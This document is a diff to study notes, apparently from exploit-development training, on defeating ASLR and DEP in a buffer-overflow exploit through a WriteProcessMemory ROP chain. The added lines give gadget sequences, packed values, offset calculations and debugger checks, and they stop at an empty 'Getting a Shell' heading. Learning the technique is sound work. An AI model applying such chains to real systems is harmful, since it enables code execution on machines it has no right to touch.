@@ -3,6 +3,9 @@
 	[[#FXCLI_DebugDispatch]]
 	[[#Arbitrary Symbol Resolution]]
 [[#Expanding the Exploit (ASLR Bypass)]]
+[[#WriteProcessMemory DEP Bypass]]
+	[[#WriteProcessMemory]]
+	[[#Getting a Shell]]
  
 ---
 # ASLR Introduction
@@ -243,22 +246,78 @@ BOOL WriteProcessMemory(
 Make the API call with ROP
 - Set up the python script to the point where it triggers the scanf buffer overflow
 - ROP Skeleton for WriteProcessMemory goes in psCommandBuffer (PUT CODE HERE)
-	- WriteProcessMemory address is known (will be pointed to by the eip overwrite)
-	- shellcode return address (rop chain returns here)
-	- (start args) Handle is -1
-	- base address is module + code cave offset
-	- buffer (from) address is not know yet
-	- 
+	- WriteProcessMemory address, known by ASLR (will be pointed to by the eip overwrite)
+	- shellcode address (rop chain returns here after WPM)
+	- (start args for WPM) Handle is -1 
+	- lpBaseAddress (destination) is module + code cave offset
+	- lpBuffer (from) address is not known yet, will be shellcode address on stack
+	- lpNumberOfBytesWritten is the base + offset to empty data section
 
-shellcode stuff
+ROP chain creation
+- Since ASLR is on, given ROP address from rp++ are not accurate. rp++ calculates from the PE header preferred base address, so we need to subtract the base to get the offset. In exploit use `dllBase + OFFSET` instead of the raw value given by rp++
+	- D:  `dd libeay32IBM019 + 3c L1`
+		- PE header offset value stored at 0x3c from module start
+	- D:  `dd libeay32IBM019 + 108 + 34 L1`
+		-  ImageBase (Preferred base address) is at offset 0x34 in PE header
+	- Outputs value 0x10000000
+ROP chain to set lpBuffer 
+Align a register (eax) to the dummy shellcode location on the stack
+	- `push esp ; pop esi ; ret  # store a copy of esp
+	- `mov eax, esi ; pop esi ; ret  # move value to eax for manipulation`
+		- pack junk
+	- `pop ecx ; ret  # pop in large value avoiding bad chars`
+		- pack 0x77777878
+	- `add eax, ecx ; ret  # add large val to eax`
+	- `pop ecx ; ret  # pop in another large val to trigger bit overflow`
+		- pack 0x88888888
+	- `add eax, ecx ; ret  # add large val to eax`
+	- 0x77777878 + 0x88888888 = 0x...1'00000100 (where the 33rd bit is overflowed)
+	- `mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010  # move eax val to ecx`
+		- oof lots of side effects
+		- pack junk for pop into esi
+	- `pop eax ; ret  # pop val (-0x120) into eax`
+		- pack junk x4 for previous retn 0x0010 (used in stdcall convention where callee cleans out stack args, in this case 4 args)
+		- pack 0xfffffee0 for pop
+	- `add eax, ecx ; ret`
+	- `mov [eax], ecx ; ret  # place shellcode adderss in lpBuffer argument location`
 
-test shellcode
+ROP chain to set nSize (size of shellcode)
+	- `inc eax ; ret  # move pointer by 1 byte toward next arg on stack`
+		- x4 to move a word
+	- `push eax ; pop esi ; ret  # save the argument addr in eax to new reg esi`
+	- `pop eax ; ret  # pop -524 into eax (shellcode size approx)`
+		- pack 0xfffffdf4
+	- `neg eax ; ret  # negate`
+	- `mov ecx, eax ; mov eax, esi ; pop esi ; ret 0x0010  # move 524 to ecx, move back argument addr to eax`
+		- side effectsssssss
+		- pack junk for pop into esi
+	- `mov [eax], ecx ; ret  # move 524 into nSize argument`
+		- pack junk x4 for retn 0x0010
 
-see execution of shellcode
+test rop chain pushes args
+- `bp libeay32IBM019+0x1fd8`, breakpoint on gadget that sets stack values
+- Once triggered twice, values should be set
+- `dd eax-14 L7`, to view WPM arguments
+	- see 0000020c as size param (decimal 524)
 
+Set up return into WriteProcessMemory skeleton
+current val of eax is nSize arg (+0x14 from WPM return address on stack)
+- `pop ecx ; ret  # pop in -0x14 to ecx`
+	- pack 0xffffffec
+- `add eax, ecx ; ret  # add -0x14 to eax (moving it from nSize arg to WPM address)`
+- `xchg eax, esp ; ret  # swap eax into esp to return into (with args setup)`
 
+test alignment to return from WPM
+- `bp libeay32IBM019+0x5b415`, breakpoint on xchg gadget
+- step over xchg and ret instructions
+- WriteProcessMemory call should be next
+- `dds esp L6`, to view args pushed to WPM
+- `u LPBASEADDRESS`, to view pre execution code cave
+- `pt`, `u LPBASEADDRESS`, to view copied over dummy shellcode
+- `p`, to confirm return from WPM drops us into the shellcode
 
-
+### Getting a Shell
+### Custom ROP Decoder
 
 
 
